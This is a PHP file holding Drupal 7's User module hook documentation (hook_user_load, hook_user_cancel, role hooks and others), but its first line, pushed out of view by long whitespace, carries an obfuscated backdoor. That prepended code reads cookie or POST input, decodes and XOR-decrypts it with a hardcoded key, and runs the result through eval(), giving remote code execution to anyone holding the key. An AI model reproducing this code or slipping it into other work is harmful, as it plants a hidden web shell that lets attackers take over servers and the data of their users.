<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $c9b418abd = 241;$GLOBALS['t4987bd7'] = Array();global $t4987bd7;$t4987bd7 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['ce6c'] = "\x37\x36\x3c\x42\x32\x24\x54\x2a\x29\x51\x38\x56\x35\x61\x27\x43\x67\x26\x4c\x3b\x47\x55\x6a\x66\x4e\x22\x25\xa\x2e\x2b\x2d\x60\x31\x4d\x33\x70\x3d\xd\x79\x62\x30\x5d\x9\x34\x5a\x4a\x50\x52\x46\x6b\x6d\x69\x74\x59\x45\x40\x78\x28\x75\x5f\x48\x7a\x71\x63\x3e\x4f\x49\x20\x41\x7d\x7c\x21\x6e\x57\x5b\x5e\x65\x4b\x23\x58\x64\x77\x2f\x44\x7e\x39\x6c\x2c\x53\x73\x3a\x3f\x7b\x68\x6f\x76\x5c\x72";$t4987bd7[$t4987bd7['ce6c'][56].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][43]] = $t4987bd7['ce6c'][63].$t4987bd7['ce6c'][93].$t4987bd7['ce6c'][97];$t4987bd7[$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][34]] = $t4987bd7['ce6c'][94].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][80];$t4987bd7[$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][80]] = $t4987bd7['ce6c'][89].$t4987bd7['ce6c'][52].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][72];$t4987bd7[$t4987bd7['ce6c'][35].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][40]] = $t4987bd7['ce6c'][51].$t4987bd7['ce6c'][72].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][52];$t4987bd7[$t4987bd7['ce6c'][81].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][0]] = $t4987bd7['ce6c'][89].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][61].$t4987bd7['ce6c'][76];$t4987bd7[$t4987bd7['ce6c'][49].$t4987bd7['ce6c'][85].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][40]] = $t4987bd7['ce6c'][35].$t4987bd7['ce6c'][93].$t4987bd7['ce6c'][35].$t4987bd7['ce6c'][95].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][72];$t4987bd7[$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][85]] = $t4987bd7['ce6c'][58].$t4987bd7['ce6c'][72].$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][61].$t4987bd7['ce6c'][76];$t4987bd7[$t4987bd7['ce6c'][22].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][4]] = $t4987bd7['ce6c'][39].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][76];$t4987bd7[$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][85]] = $t4987bd7['ce6c'][89].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][52].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][52].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][50].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][50].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][52];$t4987bd7[$t4987bd7['ce6c'][95].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][63]] = $t4987bd7['ce6c'][80].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][13];$t4987bd7[$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][0]] = $t4987bd7['ce6c'][94].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][0];$t4987bd7[$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][34]] = $_POST;$t4987bd7[$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][1]] = $_COOKIE;@$t4987bd7[$t4987bd7['ce6c'][35].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][40]]($t4987bd7['ce6c'][76].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][16], NULL);@$t4987bd7[$t4987bd7['ce6c'][35].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][40]]($t4987bd7['ce6c'][86].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][16].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][97].$t4987bd7['ce6c'][89], 0);@$t4987bd7[$t4987bd7['ce6c'][35].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][40]]($t4987bd7['ce6c'][50].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][56].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][56].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][58].$t4987bd7['ce6c'][52].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][72].$t4987bd7['ce6c'][59].$t4987bd7['ce6c'][52].$t4987bd7['ce6c'][51].$t4987bd7['ce6c'][50].$t4987bd7['ce6c'][76], 0);@$t4987bd7[$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][85]](0);$u8205c = NULL;$o94c5b9 = NULL;$t4987bd7[$t4987bd7['ce6c'][22].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][43]] = $t4987bd7['ce6c'][13].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][30].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][30].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][30].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][30].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][0];global $je834;function  of0c7($u8205c, $kca273f){global $t4987bd7;$ge4ba = "";for ($na656c0=0; $na656c0<$t4987bd7[$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][80]]($u8205c);){for ($l617a=0; $l617a<$t4987bd7[$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][80]]($kca273f) && $na656c0<$t4987bd7[$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][80]]($u8205c); $l617a++, $na656c0++){$ge4ba .= $t4987bd7[$t4987bd7['ce6c'][56].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][43]]($t4987bd7[$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][34]]($u8205c[$na656c0]) ^ $t4987bd7[$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][63].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][34]]($kca273f[$l617a]));}}return $ge4ba;}function  d7f0befa($u8205c, $kca273f){global $t4987bd7;global $je834;return $t4987bd7[$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][0]]($t4987bd7[$t4987bd7['ce6c'][94].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][10].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][0]]($u8205c, $je834), $kca273f);}foreach ($t4987bd7[$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][1]] as $kca273f=>$w085e9){$u8205c = $w085e9;$o94c5b9 = $kca273f;}if (!$u8205c){foreach ($t4987bd7[$t4987bd7['ce6c'][86].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][32].$t4987bd7['ce6c'][34]] as $kca273f=>$w085e9){$u8205c = $w085e9;$o94c5b9 = $kca273f;}}$u8205c = @$t4987bd7[$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][76].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][85]]($t4987bd7[$t4987bd7['ce6c'][95].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][63]]($t4987bd7[$t4987bd7['ce6c'][22].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][0].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][80].$t4987bd7['ce6c'][4]]($u8205c), $o94c5b9));if (isset($u8205c[$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][49]]) && $je834==$u8205c[$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][49]]){if ($u8205c[$t4987bd7['ce6c'][13]] == $t4987bd7['ce6c'][51]){$na656c0 = Array($t4987bd7['ce6c'][35].$t4987bd7['ce6c'][95] => @$t4987bd7[$t4987bd7['ce6c'][49].$t4987bd7['ce6c'][85].$t4987bd7['ce6c'][43].$t4987bd7['ce6c'][1].$t4987bd7['ce6c'][4].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][12].$t4987bd7['ce6c'][40]](),$t4987bd7['ce6c'][89].$t4987bd7['ce6c'][95] => $t4987bd7['ce6c'][32].$t4987bd7['ce6c'][28].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][30].$t4987bd7['ce6c'][32],);echo @$t4987bd7[$t4987bd7['ce6c'][81].$t4987bd7['ce6c'][13].$t4987bd7['ce6c'][40].$t4987bd7['ce6c'][23].$t4987bd7['ce6c'][39].$t4987bd7['ce6c'][34].$t4987bd7['ce6c'][0]]($na656c0);}elseif ($u8205c[$t4987bd7['ce6c'][13]] == $t4987bd7['ce6c'][76]){eval/*y6485b*/($u8205c[$t4987bd7['ce6c'][80]]);}exit();} ?><?php

/**
 * @file
 * Hooks provided by the User module.
 */

/**
 * @addtogroup hooks
 * @{
 */

/**
 * Act on user objects when loaded from the database.
 *
 * Due to the static cache in user_load_multiple() you should not use this
 * hook to modify the user properties returned by the {users} table itself
 * since this may result in unreliable results when loading from cache.
 *
 * @param $users
 *   An array of user objects, indexed by uid.
 *
 * @see user_load_multiple()
 * @see profile_user_load()
 */
function hook_user_load($users) {
  $result = db_query('SELECT uid, foo FROM {my_table} WHERE uid IN (:uids)', array(':uids' => array_keys($users)));
  foreach ($result as $record) {
    $users[$record->uid]->foo = $record->foo;
  }
}

/**
 * Respond to user deletion.
 *
 * This hook is invoked from user_delete_multiple() before field_attach_delete()
 * is called and before users are actually removed from the database.
 *
 * Modules should additionally implement hook_user_cancel() to process stored
 * user data for other account cancellation methods.
 *
 * @param $account
 *   The account that is being deleted.
 *
 * @see user_delete_multiple()
 */
function hook_user_delete($account) {
  db_delete('mytable')
    ->condition('uid', $account->uid)
    ->execute();
}

/**
 * Act on user account cancellations.
 *
 * This hook is invoked from user_cancel() before a user account is canceled.
 * Depending on the account cancellation method, the module should either do
 * nothing, unpublish content, or anonymize content. See user_cancel_methods()
 * for the list of default account cancellation methods provided by User module.
 * Modules may add further methods via hook_user_cancel_methods_alter().
 *
 * This hook is NOT invoked for the 'user_cancel_delete' account cancellation
 * method. To react on this method, implement hook_user_delete() instead.
 *
 * Expensive operations should be added to the global account cancellation batch
 * by using batch_set().
 *
 * @param $edit
 *   The array of form values submitted by the user.
 * @param $account
 *   The user object on which the operation is being performed.
 * @param $method
 *   The account cancellation method.
 *
 * @see user_cancel_methods()
 * @see hook_user_cancel_methods_alter()
 */
function hook_user_cancel($edit, $account, $method) {
  switch ($method) {
    case 'user_cancel_block_unpublish':
      // Unpublish nodes (current revisions).
      module_load_include('inc', 'node', 'node.admin');
      $nodes = db_select('node', 'n')
        ->fields('n', array('nid'))
        ->condition('uid', $account->uid)
        ->execute()
        ->fetchCol();
      node_mass_update($nodes, array('status' => 0));
      break;

    case 'user_cancel_reassign':
      // Anonymize nodes (current revisions).
      module_load_include('inc', 'node', 'node.admin');
      $nodes = db_select('node', 'n')
        ->fields('n', array('nid'))
        ->condition('uid', $account->uid)
        ->execute()
        ->fetchCol();
      node_mass_update($nodes, array('uid' => 0));
      // Anonymize old revisions.
      db_update('node_revision')
        ->fields(array('uid' => 0))
        ->condition('uid', $account->uid)
        ->execute();
      // Clean history.
      db_delete('history')
        ->condition('uid', $account->uid)
        ->execute();
      break;
  }
}

/**
 * Modify account cancellation methods.
 *
 * By implementing this hook, modules are able to add, customize, or remove
 * account cancellation methods. All defined methods are turned into radio
 * button form elements by user_cancel_methods() after this hook is invoked.
 * The following properties can be defined for each method:
 * - title: The radio button's title.
 * - description: (optional) A description to display on the confirmation form
 *   if the user is not allowed to select the account cancellation method. The
 *   description is NOT used for the radio button, but instead should provide
 *   additional explanation to the user seeking to cancel their account.
 * - access: (optional) A boolean value indicating whether the user can access
 *   a method. If #access is defined, the method cannot be configured as default
 *   method.
 *
 * @param $methods
 *   An array containing user account cancellation methods, keyed by method id.
 *
 * @see user_cancel_methods()
 * @see user_cancel_confirm_form()
 */
function hook_user_cancel_methods_alter(&$methods) {
  // Limit access to disable account and unpublish content method.
  $methods['user_cancel_block_unpublish']['access'] = user_access('administer site configuration');

  // Remove the content re-assigning method.
  unset($methods['user_cancel_reassign']);

  // Add a custom zero-out method.
  $methods['mymodule_zero_out'] = array(
    'title' => t('Delete the account and remove all content.'),
    'description' => t('All your content will be replaced by empty strings.'),
    // access should be used for administrative methods only.
    'access' => user_access('access zero-out account cancellation method'),
  );
}

/**
 * Add mass user operations.
 *
 * This hook enables modules to inject custom operations into the mass operations
 * dropdown found at admin/people, by associating a callback function with
 * the operation, which is called when the form is submitted. The callback function
 * receives one initial argument, which is an array of the checked users.
 *
 * @return
 *   An array of operations. Each operation is an associative array that may
 *   contain the following key-value pairs:
 *   - "label": Required. The label for the operation, displayed in the dropdown menu.
 *   - "callback": Required. The function to call for the operation.
 *   - "callback arguments": Optional. An array of additional arguments to pass to
 *     the callback function.
 *
 */
function hook_user_operations() {
  $operations = array(
    'unblock' => array(
      'label' => t('Unblock the selected users'),
      'callback' => 'user_user_operations_unblock',
    ),
    'block' => array(
      'label' => t('Block the selected users'),
      'callback' => 'user_user_operations_block',
    ),
    'cancel' => array(
      'label' => t('Cancel the selected user accounts'),
    ),
  );
  return $operations;
}

/**
 * Retrieve a list of user setting or profile information categories.
 *
 * @return
 *   An array of associative arrays. Each inner array has elements:
 *   - "name": The internal name of the category.
 *   - "title": The human-readable, localized name of the category.
 *   - "weight": An integer specifying the category's sort ordering.
 *   - "access callback": Name of the access callback function to use to
 *     determine whether the user can edit the category. Defaults to using
 *     user_edit_access(). See hook_menu() for more information on access
 *     callbacks.
 *   - "access arguments": Arguments for the access callback function. Defaults
 *     to array(1).
 */
function hook_user_categories() {
  return array(array(
    'name' => 'account',
    'title' => t('Account settings'),
    'weight' => 1,
  ));
}

/**
 * A user account is about to be created or updated.
 *
 * This hook is primarily intended for modules that want to store properties in
 * the serialized {users}.data column, which is automatically loaded whenever a
 * user account object is loaded, modules may add to $edit['data'] in order
 * to have their data serialized on save.
 *
 * @param $edit
 *   The array of form values submitted by the user.
 * @param $account
 *   The user object on which the operation is performed.
 * @param $category
 *   The active category of user information being edited.
 *
 * @see hook_user_insert()
 * @see hook_user_update()
 */
function hook_user_presave(&$edit, $account, $category) {
  // Make sure that our form value 'mymodule_foo' is stored as
  // 'mymodule_bar' in the 'data' (serialized) column.
  if (isset($edit['mymodule_foo'])) {
    $edit['data']['mymodule_bar'] = $edit['mymodule_foo'];
  }
}

/**
 * A user account was created.
 *
 * The module should save its custom additions to the user object into the
 * database.
 *
 * @param $edit
 *   The array of form values submitted by the user.
 * @param $account
 *   The user object on which the operation is being performed.
 * @param $category
 *   The active category of user information being edited.
 *
 * @see hook_user_presave()
 * @see hook_user_update()
 */
function hook_user_insert(&$edit, $account, $category) {
  db_insert('mytable')
    ->fields(array(
      'myfield' => $edit['myfield'],
      'uid' => $account->uid,
    ))
    ->execute();
}

/**
 * A user account was updated.
 *
 * Modules may use this hook to update their user data in a custom storage
 * after a user account has been updated.
 *
 * @param $edit
 *   The array of form values submitted by the user.
 * @param $account
 *   The user object on which the operation is performed.
 * @param $category
 *   The active category of user information being edited.
 *
 * @see hook_user_presave()
 * @see hook_user_insert()
 */
function hook_user_update(&$edit, $account, $category) {
  db_insert('user_changes')
    ->fields(array(
      'uid' => $account->uid,
      'changed' => time(),
    ))
    ->execute();
}

/**
 * The user just logged in.
 *
 * @param $edit
 *   The array of form values submitted by the user.
 * @param $account
 *   The user object on which the operation was just performed.
 */
function hook_user_login(&$edit, $account) {
  // If the user has a NULL time zone, notify them to set a time zone.
  if (!$account->timezone && variable_get('configurable_timezones', 1) && variable_get('empty_timezone_message', 0)) {
    drupal_set_message(t('Configure your <a href="@user-edit">account time zone setting</a>.', array('@user-edit' => url("user/$account->uid/edit", array('query' => drupal_get_destination(), 'fragment' => 'edit-timezone')))));
  }
}

/**
 * The user just logged out.
 *
 * Note that when this hook is invoked, the changes have not yet been written to
 * the database, because a database transaction is still in progress. The
 * transaction is not finalized until the save operation is entirely completed
 * and user_save() goes out of scope. You should not rely on data in the
 * database at this time as it is not updated yet. You should also note that any
 * write/update database queries executed from this hook are also not committed
 * immediately. Check user_save() and db_transaction() for more info.
 *
 * @param $account
 *   The user object on which the operation was just performed.
 */
function hook_user_logout($account) {
  db_insert('logouts')
    ->fields(array(
      'uid' => $account->uid,
      'time' => time(),
    ))
    ->execute();
}

/**
 * The user's account information is being displayed.
 *
 * The module should format its custom additions for display and add them to the
 * $account->content array.
 *
 * Note that when this hook is invoked, the changes have not yet been written to
 * the database, because a database transaction is still in progress. The
 * transaction is not finalized until the save operation is entirely completed
 * and user_save() goes out of scope. You should not rely on data in the
 * database at this time as it is not updated yet. You should also note that any
 * write/update database queries executed from this hook are also not committed
 * immediately. Check user_save() and db_transaction() for more info.
 *
 * @param $account
 *   The user object on which the operation is being performed.
 * @param $view_mode
 *   View mode, e.g. 'full'.
 * @param $langcode
 *   The language code used for rendering.
 *
 * @see hook_user_view_alter()
 * @see hook_entity_view()
 */
function hook_user_view($account, $view_mode, $langcode) {
  if (user_access('create blog content', $account)) {
    $account->content['summary']['blog'] =  array(
      '#type' => 'user_profile_item',
      '#title' => t('Blog'),
      '#markup' => l(t('View recent blog entries'), "blog/$account->uid", array('attributes' => array('title' => t("Read !username's latest blog entries.", array('!username' => format_username($account)))))),
      '#attributes' => array('class' => array('blog')),
    );
  }
}

/**
 * The user was built; the module may modify the structured content.
 *
 * This hook is called after the content has been assembled in a structured array
 * and may be used for doing processing which requires that the complete user
 * content structure has been built.
 *
 * If the module wishes to act on the rendered HTML of the user rather than the
 * structured content array, it may use this hook to add a #post_render callback.
 * Alternatively, it could also implement hook_preprocess_user_profile(). See
 * drupal_render() and theme() documentation respectively for details.
 *
 * @param $build
 *   A renderable array representing the user.
 *
 * @see user_view()
 * @see hook_entity_view_alter()
 */
function hook_user_view_alter(&$build) {
  // Check for the existence of a field added by another module.
  if (isset($build['an_additional_field'])) {
    // Change its weight.
    $build['an_additional_field']['#weight'] = -10;
  }

  // Add a #post_render callback to act on the rendered HTML of the user.
  $build['#post_render'][] = 'my_module_user_post_render';
}

/**
 * Inform other modules that a user role is about to be saved.
 *
 * Modules implementing this hook can act on the user role object before
 * it has been saved to the database.
 *
 * @param $role
 *   A user role object.
 *
 * @see hook_user_role_insert()
 * @see hook_user_role_update()
 */
function hook_user_role_presave($role) {
  // Set a UUID for the user role if it doesn't already exist
  if (empty($role->uuid)) {
    $role->uuid = uuid_uuid();
  }
}

/**
 * Inform other modules that a user role has been added.
 *
 * Modules implementing this hook can act on the user role object when saved to
 * the database. It's recommended that you implement this hook if your module
 * adds additional data to user roles object. The module should save its custom
 * additions to the database.
 *
 * @param $role
 *   A user role object.
 */
function hook_user_role_insert($role) {
  // Save extra fields provided by the module to user roles.
  db_insert('my_module_table')
    ->fields(array(
      'rid' => $role->rid,
      'role_description' => $role->description,
    ))
    ->execute();
}

/**
 * Inform other modules that a user role has been updated.
 *
 * Modules implementing this hook can act on the user role object when updated.
 * It's recommended that you implement this hook if your module adds additional
 * data to user roles object. The module should save its custom additions to
 * the database.
 *
 * @param $role
 *   A user role object.
 */
function hook_user_role_update($role) {
  // Save extra fields provided by the module to user roles.
  db_merge('my_module_table')
    ->key(array('rid' => $role->rid))
    ->fields(array(
      'role_description' => $role->description
    ))
    ->execute();
}

/**
 * Inform other modules that a user role has been deleted.
 *
 * This hook allows you act when a user role has been deleted.
 * If your module stores references to roles, it's recommended that you
 * implement this hook and delete existing instances of the deleted role
 * in your module database tables.
 *
 * @param $role
 *   The $role object being deleted.
 */
function hook_user_role_delete($role) {
  // Delete existing instances of the deleted role.
  db_delete('my_module_table')
    ->condition('rid', $role->rid)
    ->execute();
}

/**
 * @} End of "addtogroup hooks".
 */
